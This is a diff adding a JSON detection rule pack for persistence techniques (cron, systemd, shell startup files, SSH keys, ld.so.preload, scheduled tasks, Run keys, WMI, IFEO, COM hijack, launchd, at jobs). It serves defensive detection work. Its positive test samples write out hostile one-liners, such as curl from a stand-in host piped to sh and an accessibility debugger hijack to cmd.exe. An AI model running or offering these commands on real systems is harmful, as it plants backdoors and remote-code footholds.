@@ -1,0 +1,763 @@
+{
+ "pack": "persistence",
+ "rules": [
+  {
+   "id": "byte-persist-cron-fetch",
+   "name": "Cron entry that fetches and runs remote content",
+   "description": "crontab piping an echoed schedule that includes curl/wget into sh.",
+   "tactic": "Persistence",
+   "technique": "T1053.003",
+   "severity": "high",
+   "weight": 50,
+   "applies_to": "both",
+   "format": "script",
+   "strings": [
+    {
+     "name": "a",
+     "type": "regex",
+     "value": "\\(\\s*crontab\\s+-l[^)\\n]{0,40}(?:;|&&)\\s*echo\\s+['\\\"]?[*0-9/,\\- ]{5,30}[^\\n]{0,120}(?:curl|wget)\\b[^\\n]{0,120}\\|\\s*(?:ba)?sh"
+    },
+    {
+     "name": "b",
+     "type": "regex",
+     "value": "/etc/cron\\.(?:d|hourly|daily)/\\S+[^\\n]{0,80}(?:curl|wget)[^\\n]{0,80}\\|\\s*(?:ba)?sh"
+    }
+   ],
+   "condition": {
+    "any": [
+     {
+      "str": "a"
+     },
+     {
+      "str": "b"
+     }
+    ]
+   },
+   "samples": {
+    "positive": [
+     {
+      "text": "(crontab -l; echo \"* * * * * curl -s http://x.example/a.sh | sh\") | crontab -"
+     }
+    ],
+    "negative": [
+     {
+      "text": "(crontab -l; echo \"0 3 * * * /usr/local/bin/backup.sh\") | crontab -"
+     },
+     {
+      "text": "echo x > /etc/cron.d/x"
+     }
+    ]
+   }
+  },
+  {
+   "id": "byte-persist-systemd-unit-dropper",
+   "name": "Systemd unit launching a downloader or shell one-liner",
+   "description": "A unit file with Service/ExecStart running curl/wget/nc/bash -c and an install section.",
+   "tactic": "Persistence",
+   "technique": "T1543.002",
+   "severity": "high",
+   "weight": 45,
+   "applies_to": "both",
+   "format": "script",
+   "strings": [
+    {
+     "name": "s",
+     "type": "ascii",
+     "value": "[Service]"
+    },
+    {
+     "name": "e",
+     "type": "regex",
+     "value": "ExecStart\\s*=\\s*[^\\n]{0,60}(?:curl|wget|nc\\s|ncat|bash\\s+-c|sh\\s+-c|python\\d?\\s+-c)[^\\n]{0,120}(?:\\|\\s*(?:ba)?sh|-e\\s+/bin|http|/dev/tcp)"
+    },
+    {
+     "name": "i",
+     "type": "ascii",
+     "value": "WantedBy="
+    }
+   ],
+   "condition": {
+    "all": [
+     {
+      "str": "s"
+     },
+     {
+      "str": "e"
+     },
+     {
+      "str": "i"
+     }
+    ]
+   },
+   "samples": {
+    "positive": [
+     {
+      "text": "[Unit]\nDescription=x\n[Service]\nExecStart=/bin/bash -c 'curl -s http://x.example/a | sh'\n[Install]\nWantedBy=multi-user.target"
+     }
+    ],
+    "negative": [
+     {
+      "text": "[Service]\nExecStart=/usr/bin/myapp --serve\n[Install]\nWantedBy=multi-user.target"
+     },
+     {
+      "text": "ExecStart=/bin/bash -c 'curl -s http://x/a | sh'"
+     }
+    ]
+   }
+  },
+  {
+   "id": "byte-persist-rclocal-bashrc-fetch",
+   "name": "Shell startup file gaining a fetch-and-run line",
+   "description": "Appending a curl/wget-to-shell line to .bashrc/.profile, or a curl/wget line to rc.local or /etc/profile.d.",
+   "tactic": "Persistence",
+   "technique": "T1546.004",
+   "severity": "high",
+   "weight": 45,
+   "applies_to": "both",
+   "format": "script",
+   "strings": [
+    {
+     "name": "a",
+     "type": "regex",
+     "value": "(?:echo|printf)\\s+['\\\"][^\\n]{0,160}(?:curl|wget)[^\\n]{0,160}\\|\\s*(?:ba)?sh[^\\n]{0,20}['\\\"]\\s*>>\\s*(?:~|\\$HOME|/root|/home/\\w+)?/?\\.?(?:bashrc|profile|bash_profile|zshrc)"
+    },
+    {
+     "name": "b",
+     "type": "regex",
+     "value": "(?:curl|wget)[^\\n]{0,160}>>\\s*/etc/(?:rc\\.local|profile(?:\\.d/\\S+)?)\\b"
+    }
+   ],
+   "condition": {
+    "any": [
+     {
+      "str": "a"
+     },
+     {
+      "str": "b"
+     }
+    ]
+   },
+   "samples": {
+    "positive": [
+     {
+      "text": "echo 'curl -s http://x.example/a | sh' >> ~/.bashrc"
+     }
+    ],
+    "negative": [
+     {
+      "text": "echo 'export PATH=$PATH:/opt/bin' >> ~/.bashrc"
+     },
+     {
+      "text": "echo hi >> /etc/rc.local"
+     }
+    ]
+   }
+  },
+  {
+   "id": "byte-persist-authorized-keys-append",
+   "name": "SSH key appended to authorized_keys by script",
+   "description": "echo/cat of a public key into authorized_keys, usually with chmod to hide the change.",
+   "tactic": "Persistence",
+   "technique": "T1098.004",
+   "severity": "medium",
+   "weight": 30,
+   "applies_to": "both",
+   "format": "script",
+   "tags": [
+    "noisy-risk"
+   ],
+   "strings": [
+    {
+     "name": "a",
+     "type": "regex",
+     "value": "(?:echo|printf)\\s+['\\\"]?ssh-(?:rsa|ed25519)\\s+[A-Za-z0-9+/=]{40,}[^\\n]{0,80}>>\\s*\\S*authorized_keys"
+    }
+   ],
+   "condition": {
+    "str": "a"
+   },
+   "samples": {
+    "positive": [
+     {
+      "text": "echo \"ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC3x9aQfZzLkq7aGsd8Xk2Jq0Bf5r8T1mWvNn4Hq9 u@h\" >> ~/.ssh/authorized_keys"
+     }
+    ],
+    "negative": [
+     {
+      "text": "echo hello >> ~/.ssh/known_hosts"
+     },
+     {
+      "text": "cat authorized_keys"
+     }
+    ]
+   }
+  },
+  {
+   "id": "byte-persist-ld-preload-write",
+   "name": "Script registering a preload library",
+   "description": "Writing a library path to /etc/ld.so.preload.",
+   "tactic": "Persistence",
+   "technique": "T1574.006",
+   "severity": "high",
+   "weight": 45,
+   "applies_to": "both",
+   "format": "script",
+   "strings": [
+    {
+     "name": "a",
+     "type": "regex",
+     "value": "(?:echo|printf|tee)\\s+[^\\n]{0,80}\\.so\\b[^\\n]{0,40}(?:>>?|tee(?:\\s+-a)?)\\s*/etc/ld\\.so\\.preload"
+    }
+   ],
+   "condition": {
+    "str": "a"
+   },
+   "samples": {
+    "positive": [
+     {
+      "text": "echo /tmp/.x/libhide.so >> /etc/ld.so.preload"
+     }
+    ],
+    "negative": [
+     {
+      "text": "cat /etc/ld.so.preload"
+     },
+     {
+      "text": "echo hi >> /etc/hosts"
+     }
+    ]
+   }
+  },
+  {
+   "id": "byte-persist-schtasks-lolbin",
+   "name": "Scheduled task launching a script host or shell with a remote payload",
+   "description": "schtasks /create running powershell/mshta/wscript/cmd with a URL or encoded argument.",
+   "tactic": "Persistence",
+   "technique": "T1053.005",
+   "severity": "high",
+   "weight": 45,
+   "applies_to": "both",
+   "format": "script",
+   "strings": [
+    {
+     "name": "a",
+     "type": "regex",
+     "value": "schtasks(?:\\.exe)?\\s+/create\\b",
+     "nocase": true
+    },
+    {
+     "name": "b",
+     "type": "regex",
+     "value": "/tr\\s+['\\\"]?[^\\n]{0,60}(?:powershell|mshta|wscript|cscript|rundll32|regsvr32|cmd(?:\\.exe)?\\s+/c)[^\\n]{0,200}(?:https?://|-enc|-e\\s+[A-Za-z0-9+/=]{20,}|\\\\AppData\\\\|\\\\Temp\\\\)",
+     "nocase": true
+    }
+   ],
+   "condition": {
+    "all": [
+     {
+      "str": "a"
+     },
+     {
+      "str": "b"
+     }
+    ]
+   },
+   "samples": {
+    "positive": [
+     {
+      "text": "schtasks /create /sc minute /mo 5 /tn Updater /tr \"powershell -w hidden -enc JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdA==\""
+     }
+    ],
+    "negative": [
+     {
+      "text": "schtasks /create /sc daily /tn Backup /tr C:\\tools\\backup.exe"
+     },
+     {
+      "text": "/tr \"powershell -enc AAAA\""
+     }
+    ]
+   }
+  },
+  {
+   "id": "byte-persist-run-key-script",
+   "name": "Run key set to a script host or shell",
+   "description": "reg add / New-ItemProperty / Set-ItemProperty writing a Run key whose value launches powershell, wscript or mshta.",
+   "tactic": "Persistence",
+   "technique": "T1547.001",
+   "severity": "high",
+   "weight": 45,
+   "applies_to": "both",
+   "format": "script",
+   "strings": [
+    {
+     "name": "a",
+     "type": "regex",
+     "value": "CurrentVersion\\\\Run(?:Once)?\\b",
+     "nocase": true
+    },
+    {
+     "name": "b",
+     "type": "regex",
+     "value": "(?:reg(?:\\.exe)?\\s+add|New-ItemProperty|Set-ItemProperty)",
+     "nocase": true
+    },
+    {
+     "name": "c",
+     "type": "regex",
+     "value": "(?:powershell|wscript|cscript|mshta|rundll32|regsvr32)[^\\n]{0,160}(?:-enc|https?://|\\\\AppData\\\\|\\\\Temp\\\\|\\.vbs|\\.js\\b|\\.hta)",
+     "nocase": true
+    }
+   ],
+   "condition": {
+    "all": [
+     {
+      "str": "a"
+     },
+     {
+      "str": "b"
+     },
+     {
+      "str": "c"
+     }
+    ]
+   },
+   "samples": {
+    "positive": [
+     {
+      "text": "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v U /d \"wscript C:\\Users\\a\\AppData\\Roaming\\u.vbs\""
+     }
+    ],
+    "negative": [
+     {
+      "text": "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v App /d \"C:\\Program Files\\App\\app.exe\""
+     },
+     {
+      "text": "wscript u.vbs"
+     }
+    ]
+   }
+  },
+  {
+   "id": "byte-persist-wmi-subscription",
+   "name": "WMI permanent event subscription",
+   "description": "__EventFilter, CommandLineEventConsumer/ActiveScriptEventConsumer and __FilterToConsumerBinding in one script.",
+   "tactic": "Persistence",
+   "technique": "T1546.003",
+   "severity": "high",
+   "weight": 50,
+   "applies_to": "both",
+   "format": "script",
+   "strings": [
+    {
+     "name": "f",
+     "type": "ascii",
+     "value": "__EventFilter",
+     "nocase": true
+    },
+    {
+     "name": "c",
+     "type": "regex",
+     "value": "CommandLineEventConsumer|ActiveScriptEventConsumer",
+     "nocase": true
+    },
+    {
+     "name": "b",
+     "type": "ascii",
+     "value": "__FilterToConsumerBinding",
+     "nocase": true
+    }
+   ],
+   "condition": {
+    "all": [
+     {
+      "str": "f"
+     },
+     {
+      "str": "c"
+     },
+     {
+      "str": "b"
+     }
+    ]
+   },
+   "samples": {
+    "positive": [
+     {
+      "text": "Set-WmiInstance -Class __EventFilter; Set-WmiInstance -Class CommandLineEventConsumer; Set-WmiInstance -Class __FilterToConsumerBinding"
+     }
+    ],
+    "negative": [
+     {
+      "text": "__EventFilter query"
+     },
+     {
+      "text": "CommandLineEventConsumer"
+     }
+    ]
+   }
+  },
+  {
+   "id": "byte-persist-ifeo-debugger",
+   "name": "Image File Execution Options debugger hijack",
+   "description": "Setting a Debugger value under Image File Execution Options.",
+   "tactic": "Persistence",
+   "technique": "T1546.012",
+   "severity": "high",
+   "weight": 45,
+   "applies_to": "both",
+   "format": "script",
+   "strings": [
+    {
+     "name": "a",
+     "type": "regex",
+     "value": "Image File Execution Options\\\\[^\\n\\\\]{1,60}",
+     "nocase": true
+    },
+    {
+     "name": "d",
+     "type": "regex",
+     "value": "\\bDebugger\\b",
+     "nocase": true
+    },
+    {
+     "name": "w",
+     "type": "regex",
+     "value": "reg(?:\\.exe)?\\s+add|Set-ItemProperty|New-ItemProperty|\\.SetValue|RegWrite",
+     "nocase": true
+    }
+   ],
+   "condition": {
+    "all": [
+     {
+      "str": "a"
+     },
+     {
+      "str": "d"
+     },
+     {
+      "str": "w"
+     }
+    ]
+   },
+   "samples": {
+    "positive": [
+     {
+      "text": "reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe\" /v Debugger /d cmd.exe"
+     }
+    ],
+    "negative": [
+     {
+      "text": "Image File Execution Options\\foo.exe Debugger"
+     },
+     {
+      "text": "reg add HKLM\\Software\\x /v Debugger /d y"
+     }
+    ]
+   }
+  },
+  {
+   "id": "byte-persist-com-hijack",
+   "name": "COM object hijack via InprocServer32 in HKCU",
+   "description": "A script writing a per-user InprocServer32 default value pointing to a DLL or scriptlet.",
+   "tactic": "Persistence",
+   "technique": "T1546.015",
+   "severity": "medium",
+   "weight": 30,
+   "applies_to": "both",
+   "format": "script",
+   "strings": [
+    {
+     "name": "a",
+     "type": "regex",
+     "value": "HKCU\\\\Software\\\\Classes\\\\CLSID\\\\\\{[0-9A-Fa-f\\-]{36}\\}\\\\InprocServer32",
+     "nocase": true
+    },
+    {
+     "name": "w",
+     "type": "regex",
+     "value": "reg(?:\\.exe)?\\s+add|New-Item|Set-ItemProperty|RegWrite",
+     "nocase": true
+    },
+    {
+     "name": "d",
+     "type": "regex",
+     "value": "\\.dll|scrobj|\\.sct",
+     "nocase": true
+    }
+   ],
+   "condition": {
+    "all": [
+     {
+      "str": "a"
+     },
+     {
+      "str": "w"
+     },
+     {
+      "str": "d"
+     }
+    ]
+   },
+   "samples": {
+    "positive": [
+     {
+      "text": "reg add HKCU\\Software\\Classes\\CLSID\\{00000000-0000-0000-0000-000000000001}\\InprocServer32 /ve /d C:\\Users\\a\\x.dll"
+     }
+    ],
+    "negative": [
+     {
+      "text": "HKCU\\Software\\Classes\\CLSID\\{00000000-0000-0000-0000-000000000001}\\InprocServer32"
+     },
+     {
+      "text": "reg add HKCU\\Software\\x /d x.dll"
+     }
+    ]
+   }
+  },
+  {
+   "id": "byte-persist-service-create-shell",
+   "name": "Service created to run a shell or script host",
+   "description": "sc create / New-Service with binPath pointing at cmd/powershell with a command or URL.",
+   "tactic": "Persistence",
+   "technique": "T1543.003",
+   "severity": "high",
+   "weight": 40,
+   "applies_to": "both",
+   "format": "script",
+   "strings": [
+    {
+     "name": "a",
+     "type": "regex",
+     "value": "\\bsc(?:\\.exe)?\\s+(?:\\\\\\\\\\S+\\s+)?create\\s+\\S+\\s+[^\\n]{0,40}binpath\\s*=\\s*\\\"?[^\\n]{0,60}(?:cmd(?:\\.exe)?\\s+/c|powershell|mshta|rundll32)[^\\n]{0,160}(?:https?://|-enc|\\\\Temp\\\\|\\\\AppData\\\\)",
+     "nocase": true
+    }
+   ],
+   "condition": {
+    "str": "a"
+   },
+   "samples": {
+    "positive": [
+     {
+      "text": "sc create evil binPath= \"cmd.exe /c powershell -enc AAAA\""
+     }
+    ],
+    "negative": [
+     {
+      "text": "sc create MyApp binPath= \"C:\\Program Files\\App\\app.exe\""
+     },
+     {
+      "text": "binPath= cmd.exe /c x"
+     }
+    ]
+   }
+  },
+  {
+   "id": "byte-persist-startup-folder-copy",
+   "name": "Payload copied into a Startup folder",
+   "description": "copy/move/Copy-Item into the Start Menu Startup directory of a script or executable from a temp path.",
+   "tactic": "Persistence",
+   "technique": "T1547.001",
+   "severity": "medium",
+   "weight": 28,
+   "applies_to": "both",
+   "format": "script",
+   "tags": [
+    "noisy-risk"
+   ],
+   "strings": [
+    {
+     "name": "a",
+     "type": "regex",
+     "value": "(?:copy|move|xcopy|Copy-Item|Move-Item)\\s+[^\\n]{0,120}Start Menu\\\\Programs\\\\Startup",
+     "nocase": true
+    },
+    {
+     "name": "b",
+     "type": "regex",
+     "value": "%TEMP%|\\$env:TEMP|\\\\AppData\\\\|\\\\Temp\\\\|\\.vbs|\\.js\\b|\\.bat|\\.exe",
+     "nocase": true
+    }
+   ],
+   "condition": {
+    "all": [
+     {
+      "str": "a"
+     },
+     {
+      "str": "b"
+     }
+    ]
+   },
+   "samples": {
+    "positive": [
+     {
+      "text": "copy %TEMP%\\u.vbs \"%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\u.vbs\""
+     }
+    ],
+    "negative": [
+     {
+      "text": "copy notes.txt \"%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\n.txt\""
+     },
+     {
+      "text": "%TEMP%\\u.vbs"
+     }
+    ]
+   }
+  },
+  {
+   "id": "byte-persist-launchagent-plist",
+   "name": "LaunchAgent/LaunchDaemon plist running a shell or fetcher",
+   "description": "A launchd plist with RunAtLoad/KeepAlive and ProgramArguments invoking sh/bash/osascript/curl/python.",
+   "tactic": "Persistence",
+   "technique": "T1543.001",
+   "severity": "high",
+   "weight": 45,
+   "applies_to": "both",
+   "format": "script",
+   "strings": [
+    {
+     "name": "p",
+     "type": "ascii",
+     "value": "<key>ProgramArguments</key>"
+    },
+    {
+     "name": "r",
+     "type": "regex",
+     "value": "<key>(?:RunAtLoad|KeepAlive|StartInterval)</key>"
+    },
+    {
+     "name": "s",
+     "type": "regex",
+     "value": "<string>(?:/bin/(?:ba)?sh|/usr/bin/osascript|/usr/bin/curl|/usr/bin/python3?|/tmp/[^<]{1,60}|/private/tmp/[^<]{1,60}|/Users/Shared/[^<]{1,60})</string>"
+    },
+    {
+     "name": "c",
+     "type": "regex",
+     "value": "<string>-c</string>|<string>-e</string>|/tmp/|curl"
+    }
+   ],
+   "condition": {
+    "all": [
+     {
+      "str": "p"
+     },
+     {
+      "str": "r"
+     },
+     {
+      "str": "s"
+     },
+     {
+      "str": "c"
+     }
+    ]
+   },
+   "samples": {
+    "positive": [
+     {
+      "text": "<plist><dict><key>Label</key><string>com.x</string><key>ProgramArguments</key><array><string>/bin/bash</string><string>-c</string><string>curl -s http://x | sh</string></array><key>RunAtLoad</key><true/></dict></plist>"
+     }
+    ],
+    "negative": [
+     {
+      "text": "<plist><dict><key>ProgramArguments</key><array><string>/Applications/App.app/Contents/MacOS/App</string></array><key>RunAtLoad</key><true/></dict></plist>"
+     },
+     {
+      "text": "<key>ProgramArguments</key><key>RunAtLoad</key><string>/bin/sh</string>"
+     }
+    ]
+   }
+  },
+  {
+   "id": "byte-persist-launchctl-load-tmp",
+   "name": "launchctl loading a plist from a user-writable path",
+   "description": "launchctl load/bootstrap pointing at a plist in /tmp or ~/Library/LaunchAgents after a heredoc/echo write.",
+   "tactic": "Persistence",
+   "technique": "T1543.001",
+   "severity": "medium",
+   "weight": 30,
+   "applies_to": "both",
+   "format": "script",
+   "tags": [
+    "noisy-risk"
+   ],
+   "strings": [
+    {
+     "name": "a",
+     "type": "regex",
+     "value": "launchctl\\s+(?:load|bootstrap)\\s+(?:-w\\s+)?(?:gui/\\d+\\s+)?(?:/tmp/|/private/tmp/|~/Library/LaunchAgents/|\\$HOME/Library/LaunchAgents/|/Library/LaunchDaemons/)\\S+\\.plist"
+    },
+    {
+     "name": "w",
+     "type": "regex",
+     "value": "(?:cat\\s*>|echo\\s+[^\\n]{0,200}>|tee\\s+|<<\\s*['\\\"]?EOF)",
+     "nocase": true
+    }
+   ],
+   "condition": {
+    "all": [
+     {
+      "str": "a"
+     },
+     {
+      "str": "w"
+     }
+    ]
+   },
+   "samples": {
+    "positive": [
+     {
+      "text": "cat > ~/Library/LaunchAgents/com.x.plist <<EOF\n</plist>\nEOF\nlaunchctl load ~/Library/LaunchAgents/com.x.plist"
+     }
+    ],
+    "negative": [
+     {
+      "text": "launchctl load ~/Library/LaunchAgents/com.x.plist"
+     },
+     {
+      "text": "cat > file.txt"
+     }
+    ]
+   }
+  },
+  {
+   "id": "byte-persist-at-anacron-job",
+   "name": "At-job or cron.d drop from a download",
+   "description": "Using at/batch or writing /etc/cron.d with a piped download.",
+   "tactic": "Persistence",
+   "technique": "T1053.002",
+   "severity": "medium",
+   "weight": 25,
+   "applies_to": "both",
+   "format": "script",
+   "tags": [
+    "noisy-risk"
+   ],
+   "strings": [
+    {
+     "name": "a",
+     "type": "regex",
+     "value": "echo\\s+['\\\"][^\\n]{0,160}(?:curl|wget)[^\\n]{0,160}['\\\"]\\s*\\|\\s*at\\s+(?:now|\\d)"
+    }
+   ],
+   "condition": {
+    "str": "a"
+   },
+   "samples": {
+    "positive": [
+     {
+      "text": "echo 'curl -s http://x.example/a | sh' | at now + 1 minute"
+     }
+    ],
+    "negative": [
+     {
+      "text": "echo 'backup.sh' | at now + 1 minute"
+     },
+     {
+      "text": "echo hi | batch"
+     }
+    ]
+   }
+  }
+ ]
+}
